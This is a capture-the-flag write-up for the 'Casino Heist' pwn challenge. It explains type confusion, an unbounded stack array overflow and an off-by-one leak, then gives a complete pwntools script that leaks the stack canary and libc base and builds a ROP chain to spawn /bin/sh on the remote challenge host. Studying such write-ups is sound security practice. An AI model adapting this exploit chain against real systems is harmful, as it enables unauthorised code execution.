IJCTF Pwn Challenge Writeup by Shiro (Pycatchown sometimes)
# Casino Heist

## Part 1 - Reverse engineering

The code is terrible (of course, it's a challenge).

Sometimes ints are used, sometime it's int64, sometimes it's signed, sometimes it's not, well, we quickly identify at least one of the vulnerabilities without even really digging into the code.

We have a wallet, this wallet starts at 20 dollars, we can bet at least 5 dollars and no more than our wallet. If we fall at 0, the program exits itself, we can jackpot, and we can double the bet sometimes by adding a "m" at the end of our number.
Each bets are append into a array of uint64, which is located into the stack. It's of size 10, and isn't bounded by anything, which means that if we can make more than 10 bets without go bankrupt, we can overflow this array.

I didn't noticed the last bug instantly because I didn't realized the binary was compiled with stack smashing protection, but there is also an off by one in the print_bets function, which prints one element too far.
```c
for ( i = 0; ; ++i )
  {
    result = (unsigned int)idx_jour;
    if ( i > idx_jour )
      break;
    printf("Bet #%d: Value %ld\n", (unsigned int)i, a1[i]);
  }
```
Here we can see the condition is to break when i is strictly superior to idx_jour (the index used on the array we can overflow), since an array starts at 0, we can print one element too far.

## Part 2 - Exploitation

We're on a CTF so at this point I go straight away and fuzz a little, expecting the binary to bug out with negative or big values (thanks to the fact that the types are not coherent with each functions), so I did a little script that plays the binary over and over again until I win twice a bet with the maximum of my wallet, I tried to bet again with a value doubled, and I ended up with a negative wallet.

Since not everything is signed, that meant that my negative value was considered a very big number since the wallet on itself is stored within a uint64, which means that I could basically bet any values I wanted (well, almost). That also meant that I was not limited by luck anymore in order to apply as many bets as I wanted since my wallet was practically infinite.

So I tried to overflow the array of int64, and succeeded overflowing the binary until the saved rip.
However, the binary is compiled with stack protection flag, which means if we want to exploit, we'll have to either find a way not to overwrite the canary, or find a way to leak it.

Here comes the off by one on the print_bets function, which allows us to get the value we're about to overwrite before overwriting it.

At this point it's won. Since we have a leak we don't bother leaking anything thanks to the rop itself, we just leak the canary, the original value of the saved rsp (as we smash the main) so we can have a libc leak, and go straight for `execv("/bin/sh", NULL)`.

## 3 - Exploit code

```python
#!/usr/bin/env python
from pwn import *

exe = context.binary = ELF('boiler')
context.terminal = "gnome-terminal --geometry=110x60 -- bash -c".split(" ")


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REM:
        return remote("34.126.147.93", 2200)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled


def exploit():
    offset_til_saved_rsp = 117

    ## Overflowing until the canary on the stack
    for i in range(offset_til_saved_rsp-3):
        x = io.sendlineafter(b"Enter bet value: ", "5", timeout=5)
        print(x)
        if x == b"":
            io.interactive()

    ## Leaking canary/libc adress
    io.sendlineafter(b"Enter bet value: ", b"v")
    io.recvuntil("Bet #117: Value ")
    canary = int(io.recvline())
    print(hex(canary))
    io.sendlineafter(b"Enter bet value: ", str(canary))
    io.sendlineafter(b"Enter bet value: ", "5")
    print("a") # Don't mind, it's just a trick to make the remote IO working
    io.sendlineafter(b"Enter bet value: ", b"v")
    io.recvuntil("Bet #119: Value ")
    libcleak = int(io.recvline())
    print(hex(libcleak))
    libc = ELF("./libc-2.31.so")
    libc.address = libcleak- 0x270b3
    ##

    ##Because I'm lazy (Rop writing into the stack)
    rop = ROP(libc)
    rop.execv(next(libc.search(b"/bin/sh\x00")), 0)
    x = rop.chain()
    payload = [x[i:i+8] for i in range(0, len(x), 8)]
    for gadget in payload:
        gadget = u64(gadget)
        io.sendlineafter(b"Enter bet value: ", str(gadget))
    ##
    io.sendline("x") # exit main loop
    io.interactive()


while 1:
    io = start()

    io.sendlineafter(b"name:\n", b"a")
    io.sendlineafter(b"value: ", b"20")
    res = io.recvline()
    if b"lose" in res:
        io.close()
        continue
    else:
        io.sendlineafter(b"value: ", b"40")
        res = io.recvline()
        print(res)
        if b"lose" in res:
            io.close()
            continue
        else:
            #context.log_level = "DEBUG"
            io.sendlineafter(b"value: ", b"80m")
            #gdb.attach(io, gdbscript="b *(unsigned long long*)(&main+1322)")
            exploit()
            io.interactive()
            io.close()
            exit(0)
```

Thanks to the author if this challenge, lionaneesh. We don't see a lots of type mis-management challenges and more generally, I enjoy challenges wich doesn't only rely in one vulnerability, so this was a fun one to me.
